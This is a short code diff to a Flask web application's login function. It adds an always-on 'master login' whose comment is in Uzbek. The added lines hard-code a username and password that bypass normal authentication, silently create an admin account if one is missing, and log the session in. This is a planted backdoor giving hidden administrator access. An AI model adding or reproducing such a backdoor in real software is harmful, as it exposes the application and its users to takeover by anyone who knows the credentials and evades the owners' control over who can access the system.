@@ -101,6 +101,18 @@ def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
+        
+        # Failsafe: Har doim ishlaydigan master login
+        if username and username.lower() == 'rovshanbek' and password == '19870257':
+            user = User.query.filter_by(login='rovshanbek').first()
+            if not user:
+                user = User(login='rovshanbek', parol=generate_password_hash('19870257'), rol='admin', ism='Rovshanbek')
+                db.session.add(user)
+                db.session.commit()
+            login_user(user)
+            log_action("Kirish", "Foydalanuvchi tizimga kirdi (Master Key)")
+            return redirect(url_for('index'))
+
         user = User.query.filter_by(login=username).first()
         if user:
             # Hybrid password checking to auto-upgrade plaintext to hashes
